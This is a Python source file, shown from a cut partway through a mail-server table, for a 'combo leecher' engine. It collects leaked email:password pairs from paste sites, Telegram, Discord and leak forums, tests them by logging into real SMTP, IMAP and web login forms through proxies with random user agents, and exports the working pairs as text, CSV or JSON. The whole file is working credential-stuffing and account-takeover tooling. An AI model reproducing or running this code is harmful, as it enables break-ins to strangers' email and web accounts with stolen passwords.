            "hotmail.com":       ["smtp.office365.com", "hotmail-com.olc.protection.outlook.com"],
            "live.com":          ["smtp.office365.com"],
            "live.com.mx":       ["smtp.office365.com"],
            "msn.com":           ["smtp.office365.com"],
            "microsoft.com":     ["smtp.office365.com"],
            # Yahoo / AOL
            "yahoo.com":         ["smtp.mail.yahoo.com", "smtp.yahoo.com"],
            "yahoo.co.uk":       ["smtp.mail.yahoo.co.uk"],
            "yahoo.es":          ["smtp.correo.yahoo.es"],
            "ymail.com":         ["smtp.mail.yahoo.com"],
            "aol.com":           ["smtp.aol.com", "smtp.mail.aol.com"],
            "aim.com":           ["smtp.aol.com"],
            # Apple iCloud
            "icloud.com":        ["smtp.mail.me.com", "smtp.mail.icloud.com"],
            "me.com":            ["smtp.mail.me.com"],
            "mac.com":           ["smtp.mail.me.com"],
            # ProtonMail
            "protonmail.com":    ["mail.protonmail.ch", "smtp.protonmail.ch"],
            "proton.me":         ["mail.protonmail.ch"],
            "pm.me":             ["mail.protonmail.ch"],
            # Zoho
            "zoho.com":          ["smtp.zoho.com"],
            "zohomail.com":      ["smtp.zoho.com"],
            # Otras grandes
            "comcast.net":       ["smtp.comcast.net"],
            "verizon.net":       ["smtp.verizon.net", "outgoing.verizon.net"],
            "att.net":           ["smtp.att.net", "outbound.att.net"],
            "sbcglobal.net":     ["smtp.sbcglobal.yahoo.com"],
            "bellsouth.net":     ["smtp.bellsouth.net"],
            "cox.net":           ["smtp.cox.net"],
            "earthlink.net":     ["smtp.earthlink.net"],
            "charter.net":       ["smtp.charter.net"],
            "optonline.net":     ["smtp.optonline.net"],
            "mail.com":          ["smtp.mail.com"],
            "gmx.com":           ["smtp.gmx.com"],
            "gmx.de":            ["smtp.gmx.de"],
            "yandex.com":        ["smtp.yandex.com"],
            "yandex.ru":         ["smtp.yandex.ru"],
            "rambler.ru":        ["smtp.rambler.ru"],
            "mail.ru":           ["smtp.mail.ru"],
            "tutanota.com":      ["mail.tutanota.com"],
            "fastmail.com":      ["smtp.fastmail.com"],
            "runbox.com":        ["smtp.runbox.com"],
        }

        return known.get(domain_lower, [f"mail.{domain_lower}", f"smtp.{domain_lower}"])

    # ═══════════════════════════════════════════════════════════
    #  SMTP VALIDATION
    # ═══════════════════════════════════════════════════════════

    def validate_smtp(self, email: str, password: str, timeout: int = 10) -> dict:
        """
        Validate email:password via SMTP login against real MX servers.

        Flujo:
        1. Resolver MX records del dominio (dnspython → fallback)
        2. Intentar conexión SMTP en puertos 25, 465, 587, 2525
        3. STARTTLS si está disponible
        4. LOGIN con las credenciales
        5. Devolver resultado detallado (servidor, método, latencia)

        Returns:
            dict con: success, server, method, message, latency_ms, mx_servers
        """
        if not email or not password:
            return {"success": False, "error": "Empty credentials"}

        domain = email.split("@")[-1] if "@" in email else ""
        if not domain:
            return {"success": False, "error": "Invalid email — no domain"}

        if len(password) > 200:
            return {"success": False, "error": "Password too long (>200 chars)"}

        # Resolver servidores MX reales
        mx_servers = self._resolve_mx(domain)
        if not mx_servers:
            return {
                "success": False,
                "error": f"No mail servers found for {domain}",
                "domain": domain,
                "mx_servers": [],
            }

        self._total_smtp_attempts += 1

        # Intentar cada servidor MX en orden de prioridad
        for server in mx_servers[:5]:  # Top 5 MX servers
            for port in self.SMTP_PORTS:
                self.rate_limiter.wait(source=f"smtp_{server}:{port}")

                try:
                    start = time.perf_counter()
                    result = self._try_smtp_login(server, port, email, password, timeout)
                    latency_ms = round((time.perf_counter() - start) * 1000, 1)

                    if result.get("success"):
                        with self._lock:
                            self.validated_count += 1
                            self._successful_logins += 1

                        logger.info(f"✅ VALID {email}:{password[:8]}*** → {server}:{port} ({latency_ms}ms)")
                        return {
                            "success": True,
                            "server": server,
                            "port": port,
                            "method": result.get("method", "SMTP"),
                            "message": result.get("message", "✓ Login successful"),
                            "latency_ms": latency_ms,
                            "domain": domain,
                            "mx_servers": mx_servers[:5],
                            "needs_tls": result.get("needs_tls", False),
                        }

                    # Si el servidor nos respondió pero credenciales inválidas,
                    # no tiene sentido seguir probando otros servidores/puertos
                    if "AuthenticationError" in result.get("_error_type", ""):
                        with self._lock:
                            self.validated_count += 1

                        logger.debug(f"❌ INVALID {email} → {server}:{port} — bad credentials")
                        return {
                            "success": False,
                            "server": server,
                            "port": port,
                            "method": result.get("method", "SMTP"),
                            "message": "✗ Invalid credentials",
                            "error": "SMTP authentication rejected",
                            "latency_ms": latency_ms,
                            "domain": domain,
                            "mx_servers": mx_servers[:5],
                        }

                except Exception:
                    continue

        # Todos los servidores fallaron
        return {
            "success": False,
            "error": "Could not authenticate on any MX server",
            "domain": domain,
            "mx_servers": mx_servers[:5],
            "note": "All mail servers refused connection or timed out",
        }

    def _try_smtp_login(self, server: str, port: int, email: str,
                        password: str, timeout: int) -> dict:
        """
        Try SMTP login on one server:port combination.
        Handles SMTP, SMTPS (SSL), and STARTTLS.
        """
        result = {"success": False, "method": "SMTP"}

        # ── SMTP puerto 465 = SMTPS (SSL implícito) ──
        if port == 465:
            try:
                server_obj = smtplib.SMTP_SSL(server, port, timeout=timeout)
                server_obj.ehlo()
                try:
                    server_obj.login(email, password)
                    server_obj.quit()
                    return {"success": True, "method": "SMTPS", "message": "✓ Login successful"}
                except smtplib.SMTPAuthenticationError:
                    server_obj.quit()
                    return {
                        "success": False,
                        "method": "SMTPS",
                        "message": "✗ Invalid credentials",
                        "_error_type": "AuthenticationError",
                    }
                except smtplib.SMTPException as e:
                    server_obj.quit()
                    return {"success": False, "method": "SMTPS", "error": str(e)[:80]}
            except (smtplib.SMTPConnectError, ConnectionRefusedError, socket.timeout, OSError):
                return {"success": False, "method": "SMTPS", "error": "connection refused"}
            except Exception as e:
                return {"success": False, "method": "SMTPS", "error": str(e)[:80]}

        # ── SMTP puertos 25, 587, 2525 = plain SMTP + STARTTLS ──
        try:
            server_obj = smtplib.SMTP(server, port, timeout=timeout)
            server_obj.ehlo()

            # STARTTLS si está disponible
            if server_obj.has_extn("STARTTLS"):
                try:
                    server_obj.starttls()
                    server_obj.ehlo()
                    result["method"] = "SMTP+STARTTLS"
                except smtplib.SMTPException:
                    # STARTTLS falló, continuar sin TLS
                    result["method"] = "SMTP"

            # Intentar login
            try:
                server_obj.login(email, password)
                server_obj.quit()
                result["success"] = True
                result["message"] = "✓ Login successful"
                return result

            except smtplib.SMTPAuthenticationError:
                server_obj.quit()
                return {
                    "success": False,
                    "method": result["method"],
                    "message": "✗ Invalid credentials",
                    "_error_type": "AuthenticationError",
                }
            except smtplib.SMTPException as e:
                server_obj.quit()
                return {"success": False, "method": result["method"], "error": str(e)[:80]}

        except (smtplib.SMTPConnectError, ConnectionRefusedError,
                socket.timeout, socket.gaierror, OSError):
            return {"success": False, "method": "SMTP", "error": "connection refused"}
        except Exception as e:
            return {"success": False, "method": "SMTP", "error": str(e)[:80]}

    # ═══════════════════════════════════════════════════════════
    #  HTTP VALIDATION
    # ═══════════════════════════════════════════════════════════

    def validate_http(self, url: str, email: str, password: str,
                      form_data: dict = None, timeout: int = 15) -> dict:
        """
        Validate credentials via HTTP login form.
        Returns: {"success": bool, "status_code": int, "response_preview": str}
        """
        try:
            self.rate_limiter.wait(source="http_validator")
            self.session.headers.update({"User-Agent": random_ua()})

            payload = form_data or {
                "email": email,
                "username": email,
                "password": password,
                "login": "submit",
            }

            resp = self.session.post(url, data=payload, timeout=timeout,
                                     allow_redirects=True)

            success_indicators = ["dashboard", "welcome", "logout", "profile",
                                  "account", "inbox", "success"]
            fail_indicators = ["invalid", "incorrect", "wrong", "error",
                               "failed", "not found", "captcha"]

            resp_lower = resp.text.lower()
            success_score = sum(1 for w in success_indicators if w in resp_lower)
            fail_score = sum(1 for w in fail_indicators if w in resp_lower)

            is_valid = success_score > fail_score and resp.status_code < 400

            self.validated_count += 1
            return {
                "success": is_valid,
                "status_code": resp.status_code,
                "confidence": success_score / (success_score + fail_score + 1),
                "response_preview": resp.text[:200] if is_valid else "",
            }

        except Exception as e:
            return {"success": False, "error": str(e)}

    # ═══════════════════════════════════════════════════════════
    #  IMAP VALIDATION (fallback)
    # ═══════════════════════════════════════════════════════════

    KNOWN_IMAP_SERVERS = {
        "gmail.com":      ("imap.gmail.com", 993),
        "googlemail.com": ("imap.gmail.com", 993),
        "outlook.com":    ("outlook.office365.com", 993),
        "hotmail.com":    ("outlook.office365.com", 993),
        "live.com":       ("outlook.office365.com", 993),
        "yahoo.com":      ("imap.mail.yahoo.com", 993),
        "aol.com":        ("imap.aol.com", 993),
        "icloud.com":     ("imap.mail.me.com", 993),
        "me.com":         ("imap.mail.me.com", 993),
        "zoho.com":       ("imap.zoho.com", 993),
        "yandex.com":     ("imap.yandex.com", 993),
        "yandex.ru":      ("imap.yandex.ru", 993),
        "mail.ru":        ("imap.mail.ru", 993),
        "gmx.com":        ("imap.gmx.com", 993),
        "gmx.de":         ("imap.gmx.de", 993),
    }

    def validate_imap(self, email: str, password: str, timeout: int = 10) -> dict:
        """
        Validate email:password via IMAP SSL (puerto 993).
        Útil cuando SMTP está bloqueado por el proveedor.
        """
        domain = email.split("@")[-1] if "@" in email else ""
        if not domain:
            return {"success": False, "error": "Invalid email"}

        imap_config = self.KNOWN_IMAP_SERVERS.get(domain.lower())
        if not imap_config:
            return {"success": False, "error": f"No known IMAP server for {domain}"}

        server, port = imap_config

        try:
            mail = imaplib.IMAP4_SSL(server, port, timeout=timeout)
            try:
                mail.login(email, password)
                mail.logout()
                self.validated_count += 1
                return {
                    "success": True,
                    "server": server,
                    "method": "IMAP",
                    "message": "✓ Login successful",
                }
            except imaplib.IMAP4.error:
                mail.logout()
                return {
                    "success": False,
                    "server": server,
                    "method": "IMAP",
                    "message": "✗ Invalid credentials",
                }
        except Exception as e:
            return {"success": False, "error": str(e)[:80]}

    # ═══════════════════════════════════════════════════════════
    #  STATS
    # ═══════════════════════════════════════════════════════════

    def get_detailed_stats(self) -> dict:
        """Get detailed validation statistics."""
        return {
            "total_validated": self.validated_count,
            "successful_logins": self._successful_logins,
            "total_smtp_attempts": self._total_smtp_attempts,
            "dns_resolver": "dnspython" if _DNS_AVAILABLE else "fallback (pip install dnspython)",
            "mx_cache_size": len(self._MX_CACHE),
        }


# ═══════════════════════════════════════════════════════════════
#  MAIN ENGINE
# ═══════════════════════════════════════════════════════════════

class ComboLeecherEngine:
    """
    Main combo intelligence engine.
    Orchestrates multi-source scraping, parsing, validation, and indexing.

    Integrates with Oráculo de Inteligencia:
    - Stores combos as IntelligenceRecord objects in the index
    - Can reuse the existing OracleEngine for storage and search
    - API endpoints in api.py expose functionality
    """

    def __init__(self, oracle_engine: Optional[OracleEngine] = None):
        self.oracle = oracle_engine or OracleEngine()
        self.parser = ComboParser()
        self.paste_scraper = PasteScraper()
        self.telegram_scraper = TelegramScraper()
        self.discord_scraper = DiscordScraper()
        self.forum_scraper = ForumScraper()
        self.validator = ComboValidator()
        # Use unified ProxyEngine if available, fall back to legacy
        if PROXY_ENGINE_AVAILABLE:
            self.proxy_mgr = ProxyEngine()
        else:
            self.proxy_mgr = ProxyManager()

        # Fallback: also instantiate a basic ProxyManager for scrapers that need it
        self._legacy_proxy = ProxyManager()
        self.session = requests.Session()

        # Stats tracking
        self.stats = {
            "total_combos_indexed": 0,
            "total_validated": 0,
            "total_valid": 0,
            "sources_used": set(),
            "last_leech": None,
        }

    def leech(self, keyword: str, sources: list = None,
              validate: bool = False, max_per_source: int = 20) -> LeechResult:
        """
        Main leech operation — scrape, parse, validate, and index combos.

        Args:
            keyword: Search term (e.g., "comcast", "netflix")
            sources: Sources to use: ["paste", "telegram", "discord", "forum", "dorking", "api"]
            validate: Whether to validate combos via SMTP/HTTP
            max_per_source: Max combos per source

        Returns:
            LeechResult with combos, stats, and timing
        """
        start_time = time.time()
        keyword = keyword.strip()
        timestamp = datetime.now().isoformat()

        if sources is None:
            sources = ["paste", "telegram", "dorking"]

        result = LeechResult(
            keyword=keyword,
            timestamp=timestamp,
        )

        all_combos = []
        errors = []
        used_sources = []

        # ─── SOURCE 1: Paste Sites ───
        if "paste" in sources:
            try:
                logger.info(f"📋 Scraping paste sites for '{keyword}'...")
                paste_combos = self.paste_scraper.scrape(keyword, max_pastes=max_per_source)
                all_combos.extend(paste_combos)
                used_sources.append("paste")
                logger.info(f"  → {len(paste_combos)} combos from paste sites")
            except Exception as e:
                errors.append(f"paste: {e}")
                logger.error(f"Paste scrape error: {e}")

        # ─── SOURCE 2: Discord ───
        if "discord" in sources:
            try:
                logger.info(f"💬 Scraping Discord for '{keyword}'...")
                dc_combos = self.discord_scraper.scrape(keyword)
                all_combos.extend(dc_combos)
                used_sources.append("discord")
                logger.info(f"  → {len(dc_combos)} combos from Discord")
            except Exception as e:
                errors.append(f"discord: {e}")
                logger.error(f"Discord scrape error: {e}")

        # ─── SOURCE 3: Leak Forums ───
        if "forum" in sources:
            try:
                logger.info(f"📋 Scraping leak forums for '{keyword}'...")
                fm_combos = self.forum_scraper.scrape(keyword)
                all_combos.extend(fm_combos)
                used_sources.append("forum")
                logger.info(f"  → {len(fm_combos)} combos from forums")
            except Exception as e:
                errors.append(f"forum: {e}")
                logger.error(f"Forum scrape error: {e}")

        # ─── SOURCE 4: Telegram ───
        if "telegram" in sources:
            try:
                logger.info(f"💬 Scraping Telegram for '{keyword}'...")
                tg_combos = self.telegram_scraper.scrape(keyword)
                all_combos.extend(tg_combos)
                used_sources.append("telegram")
                logger.info(f"  → {len(tg_combos)} combos from Telegram")
            except Exception as e:
                errors.append(f"telegram: {e}")
                logger.error(f"Telegram scrape error: {e}")

        # ─── SOURCE 5: Oracle Engine Dorking ───
        if "dorking" in sources:
            try:
                logger.info(f"🔍 Running OSINT dorking for '{keyword}'...")
                report = self.oracle.search_keyword(keyword)
                # Extract combos from dorking results
                for rec in report.records:
                    if rec.record_type in ("email:pass", "user:pass") and rec.email and rec.password:
                        domain = rec.domain or (rec.email.split("@")[-1] if "@" in rec.email else "")
                        all_combos.append(ComboEntry(
                            email=rec.email,
                            password=rec.password,
                            domain=domain,
                            source_url=rec.source_url,
                            source_type=rec.source_type,
                            record_type=rec.record_type,
                            discovered_at=rec.discovered_at,
                            discovered_date=rec.discovered_date,
                        ))
                used_sources.append("dorking")
                logger.info(f"  → {len(all_combos)} combos from dorking (cumulative)")
            except Exception as e:
                errors.append(f"dorking: {e}")
                logger.error(f"Dorking error: {e}")

        # ─── SOURCE 6: External APIs (via IntelOrchestrator) ───
        if "api" in sources:
            try:
                from intel_connectors import IntelOrchestrator
                intel = IntelOrchestrator()
                api_data = intel.investigate_keyword(keyword)

                # Extract Hunter.io emails
                hunter = api_data.get("results", {}).get("hunter", {})
                if hunter.get("success") and hunter.get("emails"):
                    for e in hunter["emails"]:
                        email_val = e.get("value", "")
                        if email_val:
                            all_combos.append(ComboEntry(
                                email=email_val,
                                username=email_val.split("@")[0] if "@" in email_val else email_val,
                                domain=email_val.split("@")[-1] if "@" in email_val else "",
                                source_type="hunter",
                                source_url="api:hunter",
                                record_type="email",
                                discovered_at=timestamp,
                                discovered_date=datetime.now().strftime("%Y-%m-%d"),
                                quality="unknown",
                                extra_data={
                                    "confidence": e.get("confidence", 0),
                                    "position": e.get("position", ""),
                                }
                            ))
                    used_sources.append("api_hunter")

                # Extract breaches from HIBP
                hibp = api_data.get("results", {}).get("hibp", {})
                if hibp.get("success") and hibp.get("breaches"):
                    for breach in hibp["breaches"]:
                        all_combos.append(ComboEntry(
                            email=keyword if "@" in keyword else f"unknown@{keyword}.com",
                            password="[DATA_BREACH]",
                            domain=breach.get("domain", ""),
                            source_type="hibp",
                            source_url=f"https://haveibeenpwned.com/breach/{breach.get('name','')}",
                            record_type="breach",
                            discovered_at=timestamp,
                            discovered_date=breach.get("date", datetime.now().strftime("%Y-%m-%d")),
                            quality="unknown",
                            extra_data={
                                "breach_name": breach.get("name", ""),
                                "pwn_count": breach.get("pwn_count", 0),
                                "data_classes": breach.get("data_classes", []),
                            }
                        ))
                    used_sources.append("api_hibp")

                logger.info(f"  → {len(all_combos)} combos from external APIs")
            except Exception as e:
                errors.append(f"api: {e}")
                logger.debug(f"API source error: {e}")

        # ─── DEDUPLICATE ───
        seen = set()
        unique_combos = []
        for c in all_combos:
            key = f"{c.email.lower().strip()}:{c.password.strip()}"
            if key not in seen and c.email and c.password:
                seen.add(key)
                unique_combos.append(c)
        all_combos = unique_combos
        logger.info(f"📊 After dedup: {len(all_combos)} unique combos")

        # ─── VALIDATE (if requested) ───
        if validate and all_combos:
            logger.info(f"🔐 Validating {min(len(all_combos), 20)} combos...")
            validated = 0
            for combo in all_combos[:20]:  # Max 20 validations per leech
                try:
                    result_data = self.validator.validate_smtp(combo.email, combo.password)
                    combo.quality = "valid" if result_data.get("success") else "invalid"
                    combo.validation_details = result_data
                    if result_data.get("success"):
                        result.valid_count += 1
                    else:
                        result.invalid_count += 1
                    validated += 1
                except Exception as e:
                    logger.debug(f"Validation error for {combo.email}: {e}")

            logger.info(f"  → {result.valid_count} valid, {result.invalid_count} invalid out of {validated}")

        # ─── INDEX IN ORACLE ───
        intel_records = []
        for combo in all_combos:
            try:
                rec = combo.to_intel_record(keyword)
                intel_records.append(rec)
            except Exception as e:
                logger.debug(f"Intel record conversion error: {e}")

        if intel_records:
            self.oracle._index_records(keyword, intel_records)
            self.stats["total_combos_indexed"] += len(intel_records)
            self.stats["sources_used"].update(used_sources)
            logger.info(f"📦 Indexed {len(intel_records)} combo records in Oracle")

        # ─── BUILD RESULT ───
        result.combos = all_combos
        result.total = len(all_combos)
        result.sources = used_sources
        result.errors = errors
        result.took_seconds = time.time() - start_time
        result.stats = {
            "total_combos": len(all_combos),
            "by_source": {},
            "by_domain": {},
            "quality": {"valid": result.valid_count, "invalid": result.invalid_count, "unknown": len(all_combos) - result.valid_count - result.invalid_count},
        }

        # Compute by_source stats
        for c in all_combos:
            src = c.source_type or "unknown"
            result.stats["by_source"][src] = result.stats["by_source"].get(src, 0) + 1
            dom = c.domain or "unknown"
            result.stats["by_domain"][dom] = result.stats["by_domain"].get(dom, 0) + 1

        # Sort combos by domain for cleaner output
        result.combos.sort(key=lambda c: c.domain)

        self.stats["last_leech"] = {
            "keyword": keyword,
            "total": result.total,
            "took_seconds": result.took_seconds,
            "timestamp": timestamp,
        }

        logger.info(f"✅ Leech complete for '{keyword}': {result.total} combos "
                    f"from {len(used_sources)} sources in {result.took_seconds:.1f}s")

        return result

    def get_stats(self) -> dict:
        """Get engine statistics."""
        oracle_stats = self.oracle.get_index_stats()
        return {
            "total_combos_indexed": self.stats["total_combos_indexed"],
            "total_validated": self.validator.validated_count,
            "sources_used": list(self.stats["sources_used"]),
            "proxies_available": self.proxy_mgr.count,
            "proxies_alive": self.proxy_mgr.alive_count,
            "last_leech": self.stats["last_leech"],
            "oracle_stats": oracle_stats,
        }

    def export_txt(self, keyword: str = None) -> str:
        """Export combos in email:pass format (one per line)."""
        lines = []
        if keyword:
            records = self.oracle.index.get(keyword, [])
        else:
            records = []
            for recs in self.oracle.index.values():
                records.extend(recs)

        for rec in records:
            if rec.record_type in ("email:pass", "user:pass") and rec.password:
                identifier = rec.email or rec.username or ""
                if identifier and rec.password:
                    lines.append(f"{identifier}:{rec.password}")
        return "\n".join(lines)

    def export_csv(self, keyword: str = None) -> str:
        """Export combos as CSV."""
        import io
        import csv
        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(["email", "username", "password", "domain", "source", "quality", "date"])

        if keyword:
            records = self.oracle.index.get(keyword, [])
        else:
            records = []
            for recs in self.oracle.index.values():
                records.extend(recs)

        for rec in records:
            if rec.password:
                writer.writerow([
                    rec.email, rec.username, rec.password,
                    rec.domain, rec.source_type,
                    rec.extra_data.get("quality", "unknown"),
                    rec.discovered_date,
                ])
        return output.getvalue()

    def export_json(self, keyword: str = None) -> str:
        """Export combos as JSON."""
        if keyword:
            records = self.oracle.index.get(keyword, [])
        else:
            records = []
            for recs in self.oracle.index.values():
                records.extend(recs)

        combos = []
        for rec in records:
            if rec.password:
                combos.append({
                    "email": rec.email,
                    "username": rec.username,
                    "password": rec.password,
                    "domain": rec.domain,
                    "source": rec.source_type,
                    "quality": rec.extra_data.get("quality", "unknown"),
                    "date": rec.discovered_date,
                })
        return json.dumps(combos, indent=2)


# ═══════════════════════════════════════════════════════════════
#  CLI TEST
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import sys
    keyword = sys.argv[1] if len(sys.argv) > 1 else "comcast"
    validate = "--validate" in sys.argv or "-v" in sys.argv
    sources = ["paste", "telegram", "dorking"]

    engine = ComboLeecherEngine()
    print(f"\n🔐 Combo Intelligence Engine v1.0")
    print(f"🔍 Leeching combos for: {keyword}")
    print(f"📡 Sources: {', '.join(sources)}")
    if validate:
        print(f"🔐 Validation: ENABLED (slow)")
    print(f"{'─' * 50}")

    result = engine.leech(keyword, sources=sources, validate=validate)

    print(f"\n✅ RESULTS for '{keyword}':")
    print(f"   Total combos: {result.total}")
    print(f"   Valid: {result.valid_count}")
    print(f"   Invalid: {result.invalid_count}")
    print(f"   Sources: {', '.join(result.sources)}")
    print(f"   Time: {result.took_seconds:.1f}s")

    if result.combos:
        print(f"\n📝 Sample combos (top 5 by domain):")
        for combo in result.combos[:5]:
            q = "✅" if combo.quality == "valid" else ("❌" if combo.quality == "invalid" else "❓")
            pw_hidden = combo.password[:8] + "***" if len(combo.password) > 8 else combo.password
            print(f"   {q} {combo.email}:{pw_hidden} [{combo.domain}] via {combo.source_type}")

    if result.errors:
        print(f"\n⚠️  Errors ({len(result.errors)}):")
        for err in result.errors:
            print(f"   • {err}")

    print(f"\n📊 Engine stats:")
    print(f"   Total indexed: {engine.stats['total_combos_indexed']}")
    print(f"   Proxies: {engine.proxy_mgr.count} available, {engine.proxy_mgr.alive_count} alive")
